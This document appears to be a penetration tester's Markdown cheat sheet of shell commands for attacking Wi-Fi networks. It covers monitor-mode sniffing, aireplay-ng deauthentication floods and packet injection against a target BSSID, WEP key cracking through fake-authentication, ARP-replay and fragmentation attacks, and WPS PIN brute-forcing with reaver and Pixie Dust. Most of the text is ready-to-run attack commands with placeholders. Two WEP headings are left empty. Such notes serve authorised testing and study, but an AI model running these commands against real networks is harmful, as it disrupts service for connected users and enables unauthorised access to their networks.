
### Wi-Fi Drivers
---

```shell
# View Current WiFi Driver
sudo airmon-ng
nmcli # if PCI device
lsusb # if USB device

# List Driver Info and Params
sudo modinfo <driver>
# Modify Driver Parameters
sudo modprobe <driver> <param>=<value>

# List Loaded Kernel Modules
lsmod
# Remove Kernel Module / Dependencies
sudo rmmod <driver> # Might need to specify dependencies if an error returns
```

### Wireless Tools
---

```shell
# Return detailed wireless interface information
sudo iw list

# Scan for Wi-Fi signals on a specified interface
sudo iw dev <dev> scan # | grep "SSID:|DS Parameter set:"

# Add a separate monitor mode interface based on an existing interface
sudo iw dev <interface> interface add <monitor_name> type monitor
# Bring new interface up
sudo ip link set <monitor_name> up
# Get information on new interface
sudo iw dev <monitor_name> info
# Sniff traffic new monitor interface
sudo tcpdump -i <monitor_name>
# Delete monitor interface
sudo iw dev <monitor_name> interface del

# Get Current Wi-Fi Regulatory Domain
sudo iw reg get
# Set Wi-Fi Regulatory Domain (Volatile / In-Memory)
sudo iw reg set US
# Set Wi-Fi Regulatory Domain (Persistent)
sudo nano /etc/default/crda # example: REGDOMAIN=US

# List RF Devices
sudo rfkill list
# Soft Block Management
sudo rfkill block <device_id>
sudo rfkill unblock <device_id>
```

### Air- Suite
---

```shell
# See available networks/channels
sudo airodump-ng <mon_interface>
# Specify channel to hone in on a target network and output to file
sudo airodump-ng --bssid <target_bssid> -c <channel> --write <outfile> <mon_intercace>
### New Terminal ###
# See if network interface can communicate with target
sudo aireplay-ng -9 -a <target_bssid> <mon_interface>
# If successful, you should be able to inject/deauth
sudo aireplay-ng --deauth 100 -a <target_bssid> <mon_interface>

### AIRCRACK ###
sudo aircrack-ng
# 0 ## Deauthentication
# 1 ## Fake Authentication
# 2 ## Interactive Packet Replay
# 3 ## ARP Request Replay Attack
# 4 ## KoreK ChopChop Attack
# 5 ## Fragmentation Attack
# 6 ## Café-Latte Attack
# 7 ## Client-Oriented Fragmentation Attack
# 9 ## Injection Test
```

### WEP Cracking
---
```shell
# Fake Authentication Attack
aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface> #

# Deauthentication Attack
aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>

### ARP Request Replay Attack
aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>
aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface> ### ARP Request ###
aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>

## Interactive Packet Replay Attack
aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>
aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>

### Fragmentation Attack
aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your MAC> <interface>
aireplay-ng -5 -b <AP_MAC> -h <Your MAC> <interface>

## Korek ChopChop Attack

## Bypassing WEP Shared Key Authentication

```

### WPS Cracking
---
```shell
# Query for networks with WPS support
sudo wash -i <mon_interface>

# Bruteforce a target WPS Network
sudo reaver -b <bssid> -c <channel> -i wlan0mon -v

# Bruteforce a target WPS Network with PixieWPS (faster)
sudo reaver -b <bssid> -c <channel> -i wlan0mon -v -K
```
